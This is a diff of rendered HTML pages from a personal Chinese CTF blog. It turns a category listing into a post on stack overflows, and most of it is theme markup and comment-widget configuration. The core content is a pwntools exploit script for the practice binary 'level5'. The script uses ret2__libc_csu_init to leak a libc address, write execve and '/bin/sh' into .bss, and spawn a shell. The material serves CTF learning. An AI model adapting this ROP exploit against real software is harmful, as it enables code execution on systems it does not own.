@@ -5,8 +5,6 @@
   <!-- SEO相关 -->
   
     
-      <meta name="robots" content="noindex,follow">
-    
   
   <!-- 渲染优化 -->
   <meta name="renderer" content="webkit">
@@ -18,7 +16,9 @@
 
   <!-- 页面元数据 -->
   
-    <title>Category: PWN - X1ngg3</title>
+    <title>StackOverFlow - X1ngg3</title>
+  
+    <meta name="keywords" content="stackoverflow">
   
   
 
@@ -331,21 +331,12 @@
     <div class='body-wrapper'>
       
 
-
 <div class='l_main'>
   
-    
-      
-  <section class="post-list ">
-    
-      
-        
-          
-        
-          
-            <div class='post-wrapper'>
-              <article class="post white-box shadow reveal ">
+
   
+    <article id="post" class="post white-box reveal shadow article-type-post" itemscope itemprop="blogPost">
+      
 
 
   <section class='meta'>
@@ -355,121 +346,11 @@
       <div class="meta" id="header-meta">
         
           
-  <h2 class="title">
-    <a href="/2020/06/28/xctf&&buuoj_pwn/">
-      从0开始的PWN学习(XCTF&&BUUOJ)
-    </a>
-  </h2>
-
-
-        
-        <div class='new-meta-box'>
-          
-            
-          
-            
-              
-<div class='new-meta-item author'>
-  <a href="https://x1ngg3.github.io" rel="nofollow">
-    <img src="https://i.loli.net/2020/05/24/ud4apZVzXN3lnMS.jpg">
-    <p>x1ngg3</p>
-  </a>
-</div>
-
-            
-          
-            
-              
-  
-  <div class='new-meta-item category'>
-    <a href='/categories/CTF/PWN/' rel="nofollow">
-      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
-      <p>CTF/PWN</p>
-    </a>
-  </div>
-
-
-            
-          
-            
-              <div class="new-meta-item date">
-  <a class='notlink'>
-    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：Jun 28, 2020</p>
-  </a>
-</div>
-
-            
-          
-            
-              
-
-            
-          
-            
-              
-  <div class="new-meta-item top-post">
-    <a class='notlink'>
-      <i class="fas fa-angle-double-up fa-fw" aria-hidden="true"></i>
-      <p>9</p>
-    </a>
-  </div>
-
-
-            
-          
-        </div>
-        
-          <hr>
-        
-      </div>
-    
-  </section>
-
-
-  <section class="article typo">
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>pwn!pwn!pwn!</p>
-      
-    </div>
-    
-      
-        <div class="button readmore">
-          <a href="/2020/06/28/xctf&&buuoj_pwn/">
-            阅读全文 <i class="fas fa-chevron-right"></i>
-          </a>
-        </div>
-      
-    
-  </section>
-</article>
-
-            </div>
-          
-        
-      
-    
-    
-      
-        
-          <div class='post-wrapper'>
-            <article class="post white-box shadow reveal ">
-  
-
-
-  <section class='meta'>
-    
-      
-      
-      <div class="meta" id="header-meta">
-        
-          
-  <h2 class="title">
+  <h1 class="title">
     <a href="/2020/09/29/Stackoverflow/">
       StackOverFlow
     </a>
-  </h2>
+  </h1>
 
 
         
@@ -516,11 +397,6 @@
 
             
           
-            
-              
-
-            
-          
         </div>
         
           <hr>
@@ -530,10 +406,10 @@
   </section>
 
 
-  <section class="article typo">
-    <div class="article-entry" itemprop="articleBody">
-      
-        <a id="more"></a>
+      <section class="article typo">
+        <div class="article-entry" itemprop="articleBody">
+          
+          <a id="more"></a>
 
 
 
@@ -579,95 +455,45 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'./level5'</span>)</span><br><span class="line">sh = process(<span class="string">'./level5'</span>)</span><br><span class="line">bss_base = elf.bss()</span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">a_addr = <span class="number">0x400600</span>     <span class="comment">#csu_start_addr   </span></span><br><span class="line">b_addr = <span class="number">0x40061A</span>     <span class="comment">#csi_end_addr</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13, r14, r15, ret_addr)</span>:</span></span><br><span class="line">    payload = (<span class="number">0x80</span> + <span class="number">8</span>) * <span class="string">'a'</span>  + p64(b_addr)</span><br><span class="line">    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(a_addr)</span><br><span class="line">    payload += (<span class="number">8</span> + <span class="number">0x30</span>) * <span class="string">'a'</span> + p64(ret_addr)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line">csu(<span class="number">0</span>,<span class="number">1</span>,write_got,<span class="number">8</span>,write_got,<span class="number">1</span>,main_addr)</span><br><span class="line">write_addr = u64(sh.recv(<span class="number">8</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">"write"</span>,write_addr)</span><br><span class="line">base = write_addr - libc.dump(<span class="string">'write'</span>)</span><br><span class="line">execve_addr = base + libc.dump(<span class="string">'execve'</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line">csu(<span class="number">0</span>,<span class="number">1</span>,read_got,<span class="number">16</span>,bss_base,<span class="number">0</span>,main_addr)</span><br><span class="line">sh.send(p64(execve_addr) + <span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line">csu(<span class="number">0</span>,<span class="number">1</span>,bss_base,<span class="number">0</span>,<span class="number">0</span>,bss_base + <span class="number">8</span>,main_addr)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
 
-      
-    </div>
-    
-      
-    
-  </section>
-</article>
-
-          </div>
-        
-      
-        
-      
-    
-  </section>
-  
-    
-    <!-- 根据主题中的设置决定是否在archive中针对摘要部分的MathJax公式加载mathjax.js文件 -->
-    
-    
-
-  
-
-
-    
-  
-
-</div>
-<aside class='l_side'>
-  
+          
+            <div class='article_footer'>
+              
+                
   
     
     
 
-<section class="widget blogger shadow desktop mobile">
+
+
+  
+
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+<section class="widget copyright  desktop mobile">
   <div class='content'>
     
-      
-        <a class='avatar flat-box' href='/'>
-          <img no-lazy src='https://i.loli.net/2020/05/24/ud4apZVzXN3lnMS.jpg'/>
-        </a>
-      
-    
-    
-      <div class='text'>
-        
-        
-        
-          <p><span id="jinrishici-sentence">X1ngg3</span></p>
-          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
-        
-      </div>
-    
-    
-      <div class="social-wrapper">
+      <blockquote>
         
           
-            <a href="https://x1ngg3.github.io"
-              class="social fas fa-rss flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-            </a>
+            <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
+
           
         
           
-            <a href="mailto:x1ngg3@foxmail.com"
-              class="social fas fa-envelope flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-            </a>
+            <p>本文永久链接是：<a href=http://x1ngg3.github.io/2020/09/29/Stackoverflow/>http://x1ngg3.github.io/2020/09/29/Stackoverflow/</a></p>
           
         
-          
-            <a href="https://github.com/x1ngg3"
-              class="social fab fa-github flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-            </a>
-          
-        
-          
-            <a href="https://music.163.com/#/user/home?id=395984459"
-              class="social fas fa-headphones-alt flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-            </a>
-          
-        
-      </div>
+      </blockquote>
     
   </div>
 </section>
@@ -677,78 +503,191 @@
   
     
     
+
+<section class="widget qrcode  desktop mobile">
   
 
-  <section class="widget category shadow desktop">
+  <div class='content article-entry'>
+    
+  </div>
+</section>
+
+  
+
+
+              
+            </div>
+          
+        </div>
+        
+          
+
+
+  <section class='meta' id="footer-meta">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-10-02T21:23:06+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>最后更新于：Oct 2, 2020</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/stackoverflow/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>stackoverflow</p></a></div>
+
+
+        
+      
+        
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer"
+          
+          href="http://connect.qq.com/widget/shareqq/index.html?url=http://x1ngg3.github.io/2020/09/29/Stackoverflow/&title=StackOverFlow - X1ngg3&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/logo/128/qq.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer"
+          
+          href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://x1ngg3.github.io/2020/09/29/Stackoverflow/&title=StackOverFlow - X1ngg3&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/logo/128/qzone.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer"
+          
+          href="http://service.weibo.com/share/share.php?url=http://x1ngg3.github.io/2020/09/29/Stackoverflow/&title=StackOverFlow - X1ngg3&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/logo/128/weibo.png">
+          
+        </a>
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </section>
+
+
+        
+        
+          <div class="prev-next">
+            
+            
+              <a class='next' href='/2020/08/22/2020dxs/'>
+                <p class='title'>2020国赛<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+                <p class='content'>夜雨声烦
+
+
+z3
+其他还好就是复制粘贴有点累人
+123456789101112131415161718192021222324252627282930313233343536373839404...</p>
+              </a>
+            
+          </div>
+        
+      </section>
+    </article>
+  
+
+  
+    <!-- 显示推荐文章和评论 -->
+
+
+
+  <article class="post white-box reveal comments shadow">
+    <section class="article typo">
+      <p ct><i class='fas fa-comments'></i> 评论</p>
+      
+      
+      
+      
+      
+      
+        <section id="comments">
+          <div id="valine_container" class="valine_thread">
+            <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+          </div>
+        </section>
+      
+      
+    </section>
+  </article>
+
+
+  
+
+
+
+
+<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
+
+
+
+  <script>
+    window.subData = {
+      title: 'StackOverFlow',
+      tools: true
+    }
+  </script>
+
+
+</div>
+<aside class='l_side'>
+  
+  
+
+  
+    
+    
+
+
+  <section class="widget toc-wrapper shadow desktop mobile">
     
   <header>
     
-      <a href='/blog/categories/'><i class="fas fa-folder-open fa-fw" aria-hidden="true"></i><span class='name'>文章分类</span></a>
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
     
   </header>
 
 
     <div class='content'>
-      <ul class="entry navigation">
-        
-          <li><a class="flat-box"
-            title="/categories/CTF/" href="/categories/CTF/"
-            id="categoriesCTF"
-            ><div class='name'>CTF</div><div class='badge'>(8)</div></a></li>
-        
-          <li><a class="flat-box child"
-            title="/categories/CTF/PWN/" href="/categories/CTF/PWN/"
-            id="categoriesCTFPWN"
-            ><div class='name'>PWN</div><div class='badge'>(2)</div></a></li>
-        
-          <li><a class="flat-box child"
-            title="/categories/CTF/RE/" href="/categories/CTF/RE/"
-            id="categoriesCTFRE"
-            ><div class='name'>RE</div><div class='badge'>(5)</div></a></li>
-        
-          <li><a class="flat-box child"
-            title="/categories/CTF/WangDingCup-2020/" href="/categories/CTF/WangDingCup-2020/"
-            id="categoriesCTFWangDingCup-2020"
-            ><div class='name'>WangDingCup_2020</div><div class='badge'>(1)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/LR/" href="/categories/LR/"
-            id="categoriesLR"
-            ><div class='name'>LR</div><div class='badge'>(2)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/Poem/" href="/categories/Poem/"
-            id="categoriesPoem"
-            ><div class='name'>Poem</div><div class='badge'>(1)</div></a></li>
-        
-      </ul>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#写在前面的话"><span class="toc-text">写在前面的话</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#basic-rop"><span class="toc-text">basic rop</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#64位传参"><span class="toc-text">64位传参</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#系统调用"><span class="toc-text">系统调用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mediumrop"><span class="toc-text">mediumrop</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2-libc-csu-init"><span class="toc-text">ret2__libc_csu_init</span></a></li></ol>
     </div>
   </section>
 
-
-  
-
-  
-    
-    
-  
-
-  <section class="widget tagcloud shadow desktop mobile">
-    
-  <header>
-    
-      <a href='/blog/tags/'><i class="fas fa-tags fa-fw" aria-hidden="true"></i><span class='name'>热门标签</span></a>
-    
-  </header>
-
-
-    <div class='content'>
-      <a href="/tags/CrackMe160/" style="font-size: 14px; color: #999">CrackMe160</a> <a href="/tags/SCTF/" style="font-size: 14px; color: #999">SCTF</a> <a href="/tags/WangDingCup-2020/" style="font-size: 14px; color: #999">WangDingCup_2020</a> <a href="/tags/XCTF-RE/" style="font-size: 14px; color: #999">XCTF_RE</a> <a href="/tags/buuoj-re/" style="font-size: 14px; color: #999">buuoj_re</a> <a href="/tags/hook/" style="font-size: 14px; color: #999">hook</a> <a href="/tags/poem/" style="font-size: 14px; color: #999">poem</a> <a href="/tags/pwn-buuoj/" style="font-size: 14px; color: #999">pwn_buuoj</a> <a href="/tags/pwn-xctf/" style="font-size: 14px; color: #999">pwn_xctf</a> <a href="/tags/stackoverflow/" style="font-size: 14px; color: #999">stackoverflow</a> <a href="/tags/%E5%9B%BD%E8%B5%9B/" style="font-size: 14px; color: #999">国赛</a> <a href="/tags/%E6%97%A5%E6%9A%AE/" style="font-size: 14px; color: #999">日暮</a> <a href="/tags/%E6%A9%99%E9%9D%92/" style="font-size: 14px; color: #999">橙青</a> <a href="/tags/%E7%94%B5%E5%BD%B1%E6%84%9F/" style="font-size: 14px; color: #999">电影感</a> <a href="/tags/%E8%B0%83%E8%89%B2/" style="font-size: 24px; color: #555">调色</a>
-    </div>
-  </section>
-
-
-  
 
   
 
@@ -961,6 +900,60 @@
 
 
 
+
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4/dist/Valine.min.js"></script>
+
+  
+  <script>
+  var GUEST_INFO = ['nick','mail','link'];
+  var meta = 'nick,mail,link'.split(',').filter(function(item){
+    return GUEST_INFO.indexOf(item) > -1
+  });
+  var REQUIRED_FIELDS = ['nick','mail','link'];
+  var requiredFields = 'nick,mail'.split(',').filter(function(item){
+    return REQUIRED_FIELDS.indexOf(item) > -1
+  });
+  var valine = new Valine();
+  function emoji(path, idx, ext) {
+      return path + "/" + path + "-" + idx + "." + ext;
+  }
+  var emojiMaps = {};
+  for (var i = 1; i <= 54; i++) {
+    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+  }
+  for (var i = 1; i <= 101; i++) {
+    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+  }
+  for (var i = 1; i <= 116; i++) {
+    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+  }
+  for (var i = 1; i <= 125; i++) {
+    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+  }
+  for (var i = 1; i <= 4; i++) {
+    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+  }
+  valine.init({
+    el: '#valine_container',
+    meta: meta,
+    
+    appId: "VqJdqrLLhJVaQMiPLwPCBSc3-gzGzoHsz",
+    appKey: "5yKLlbbNmjEzqjXsB8Xq3vfL",
+    placeholder: "快来评论吧~",
+    pageSize:'10',
+    avatar:'robohash',
+    lang:'zh-cn',
+    visitor: 'true',
+    highlight: 'true',
+    mathJax: 'false',
+    enableQQ: 'true',
+    requiredFields: requiredFields,
+    emojiCDN: 'https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/emoji/valine/',
+    emojiMaps: emojiMaps
+  })
+  </script>
 
 
 
